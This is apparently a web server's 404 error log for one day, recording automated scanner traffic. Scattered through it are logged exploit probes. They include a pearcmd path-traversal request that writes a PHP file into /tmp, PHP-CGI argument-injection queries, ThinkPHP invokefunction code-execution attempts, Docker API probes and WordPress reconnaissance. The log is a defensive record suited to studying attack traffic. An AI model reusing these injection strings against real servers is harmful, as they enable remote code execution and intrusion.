[2026-02-19 08:59:42] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php - Matched Path: /index.php
[2026-02-19 08:59:43] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../tmp/index1 - Matched Path: /index.php
[2026-02-19 08:59:43] 404 - Method: GET - URI: /containers/json - Matched Path: /containers/json
[2026-02-19 09:02:59] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 09:14:15] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 09:14:16] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 09:16:43] 404 - Method: POST - URI: /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /hello.world
[2026-02-19 09:16:46] 404 - Method: POST - URI: /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /
[2026-02-19 09:18:49] 404 - Method: GET - URI: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello - Matched Path: /index/\think\app/invokefunction
[2026-02-19 09:19:03] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php - Matched Path: /index.php
[2026-02-19 09:19:05] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../tmp/index1 - Matched Path: /index.php
[2026-02-19 09:19:34] 404 - Method: GET - URI: /containers/json - Matched Path: /containers/json
[2026-02-19 09:21:32] 404 - Method: GET - URI: /wp-content/ - Matched Path: /wp-content
[2026-02-19 09:21:42] 404 - Method: GET - URI: /x/ - Matched Path: /x
[2026-02-19 09:21:42] 404 - Method: GET - URI: /wp-includes/PHPMailer/ - Matched Path: /wp-includes/PHPMailer
[2026-02-19 09:21:42] 404 - Method: GET - URI: /SDK/webLanguage - Matched Path: /SDK/webLanguage
[2026-02-19 09:21:43] 404 - Method: GET - URI: //wp-includes/js/dist/ - Matched Path: /wp-includes/js/dist
[2026-02-19 09:21:43] 404 - Method: GET - URI: /wp-includes/SimplePie/ - Matched Path: /wp-includes/SimplePie
[2026-02-19 09:30:11] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 10:04:27] 404 - Method: GET - URI: /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application - Matched Path: /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
[2026-02-19 10:18:29] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 10:18:30] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 10:18:30] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 10:28:02] 404 - Method: POST - URI: /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /hello.world
[2026-02-19 10:28:02] 404 - Method: POST - URI: /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /
[2026-02-19 10:28:10] 404 - Method: GET - URI: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello - Matched Path: /index/\think\app/invokefunction
[2026-02-19 10:28:10] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php - Matched Path: /index.php
[2026-02-19 10:28:10] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../tmp/index1 - Matched Path: /index.php
[2026-02-19 10:28:11] 404 - Method: GET - URI: /containers/json - Matched Path: /containers/json
[2026-02-19 10:28:58] 404 - Method: GET - URI: /wp-includes/wlwmanifest.xml - Matched Path: /wp-includes/wlwmanifest.xml
[2026-02-19 10:28:59] 404 - Method: GET - URI: /blog/wp-includes/wlwmanifest.xml - Matched Path: /blog/wp-includes/wlwmanifest.xml
[2026-02-19 10:28:59] 404 - Method: GET - URI: /web/wp-includes/wlwmanifest.xml - Matched Path: /web/wp-includes/wlwmanifest.xml
[2026-02-19 10:28:59] 404 - Method: GET - URI: /wordpress/wp-includes/wlwmanifest.xml - Matched Path: /wordpress/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:00] 404 - Method: GET - URI: /website/wp-includes/wlwmanifest.xml - Matched Path: /website/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:00] 404 - Method: GET - URI: /wp/wp-includes/wlwmanifest.xml - Matched Path: /wp/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:00] 404 - Method: GET - URI: /news/wp-includes/wlwmanifest.xml - Matched Path: /news/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:01] 404 - Method: GET - URI: /2020/wp-includes/wlwmanifest.xml - Matched Path: /2020/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:01] 404 - Method: GET - URI: /2019/wp-includes/wlwmanifest.xml - Matched Path: /2019/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:01] 404 - Method: GET - URI: /shop/wp-includes/wlwmanifest.xml - Matched Path: /shop/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:02] 404 - Method: GET - URI: /wp1/wp-includes/wlwmanifest.xml - Matched Path: /wp1/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:02] 404 - Method: GET - URI: /test/wp-includes/wlwmanifest.xml - Matched Path: /test/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:03] 404 - Method: GET - URI: /wp2/wp-includes/wlwmanifest.xml - Matched Path: /wp2/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:03] 404 - Method: GET - URI: /site/wp-includes/wlwmanifest.xml - Matched Path: /site/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:03] 404 - Method: GET - URI: /cms/wp-includes/wlwmanifest.xml - Matched Path: /cms/wp-includes/wlwmanifest.xml
[2026-02-19 10:29:04] 404 - Method: GET - URI: /sito/wp-includes/wlwmanifest.xml - Matched Path: /sito/wp-includes/wlwmanifest.xml
[2026-02-19 10:30:21] 404 - Method: GET - URI: /SDK/webLanguage - Matched Path: /SDK/webLanguage
[2026-02-19 10:31:16] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 10:48:46] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 11:25:15] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 11:31:36] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 11:31:36] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 11:31:36] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 11:31:54] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 11:58:01] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 11:58:02] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 11:58:02] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 11:58:28] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 11:58:29] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-19 12:01:23] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 12:12:36] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 12:17:42] 404 - Method: GET - URI: /dispatch.asp - Matched Path: /dispatch.asp
[2026-02-19 12:25:23] 404 - Method: HEAD - URI: / - Matched Path: /
[2026-02-19 12:25:24] 404 - Method: HEAD - URI: /_next - Matched Path: /_next
[2026-02-19 12:25:26] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 12:25:28] 404 - Method: POST - URI: /_next - Matched Path: /_next
[2026-02-19 12:30:37] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 13:33:32] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 13:40:09] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 13:40:10] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-19 13:57:12] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 14:17:42] 404 - Method: GET - URI: /wp-includes/wlwmanifest.xml - Matched Path: /wp-includes/wlwmanifest.xml
[2026-02-19 14:17:44] 404 - Method: GET - URI: /blog/wp-includes/wlwmanifest.xml - Matched Path: /blog/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:45] 404 - Method: GET - URI: /web/wp-includes/wlwmanifest.xml - Matched Path: /web/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:46] 404 - Method: GET - URI: /wordpress/wp-includes/wlwmanifest.xml - Matched Path: /wordpress/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:46] 404 - Method: GET - URI: /website/wp-includes/wlwmanifest.xml - Matched Path: /website/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:47] 404 - Method: GET - URI: /wp/wp-includes/wlwmanifest.xml - Matched Path: /wp/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:48] 404 - Method: GET - URI: /news/wp-includes/wlwmanifest.xml - Matched Path: /news/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:48] 404 - Method: GET - URI: /2020/wp-includes/wlwmanifest.xml - Matched Path: /2020/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:49] 404 - Method: GET - URI: /2019/wp-includes/wlwmanifest.xml - Matched Path: /2019/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:50] 404 - Method: GET - URI: /shop/wp-includes/wlwmanifest.xml - Matched Path: /shop/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:50] 404 - Method: GET - URI: /wp1/wp-includes/wlwmanifest.xml - Matched Path: /wp1/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:51] 404 - Method: GET - URI: /test/wp-includes/wlwmanifest.xml - Matched Path: /test/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:52] 404 - Method: GET - URI: /wp2/wp-includes/wlwmanifest.xml - Matched Path: /wp2/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:52] 404 - Method: GET - URI: /site/wp-includes/wlwmanifest.xml - Matched Path: /site/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:53] 404 - Method: GET - URI: /cms/wp-includes/wlwmanifest.xml - Matched Path: /cms/wp-includes/wlwmanifest.xml
[2026-02-19 14:17:54] 404 - Method: GET - URI: /sito/wp-includes/wlwmanifest.xml - Matched Path: /sito/wp-includes/wlwmanifest.xml
[2026-02-19 14:25:06] 404 - Method: GET - URI: /SDK/webLanguage - Matched Path: /SDK/webLanguage
[2026-02-19 14:36:30] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 14:39:23] 404 - Method: HEAD - URI: / - Matched Path: /
[2026-02-19 14:40:05] 404 - Method: HEAD - URI: / - Matched Path: /
[2026-02-19 14:40:06] 404 - Method: HEAD - URI: / - Matched Path: /
[2026-02-19 14:46:12] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 14:50:01] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 14:50:01] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 14:50:01] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 15:03:27] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-19 15:08:32] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 15:08:40] 404 - Method: GET - URI: /SDK/webLanguage - Matched Path: /SDK/webLanguage
[2026-02-19 15:16:03] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 15:16:04] 404 - Method: GET - URI: /login/sitemap.xml - Matched Path: /login/sitemap.xml
[2026-02-19 15:16:04] 404 - Method: GET - URI: /login/robots.txt - Matched Path: /login/robots.txt
[2026-02-19 15:16:05] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 15:16:06] 404 - Method: GET - URI: /login/sitemap.xml - Matched Path: /login/sitemap.xml
[2026-02-19 15:16:06] 404 - Method: GET - URI: /login/robots.txt - Matched Path: /login/robots.txt
[2026-02-19 15:16:54] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 15:16:54] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 15:16:54] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 15:19:05] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 15:21:46] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 15:32:51] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 16:09:35] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 16:10:01] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 16:10:53] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 16:10:53] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 16:10:53] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 16:11:43] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 16:11:47] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 16:13:40] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 16:13:58] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 16:13:59] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 16:17:23] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 16:17:51] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 16:18:03] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
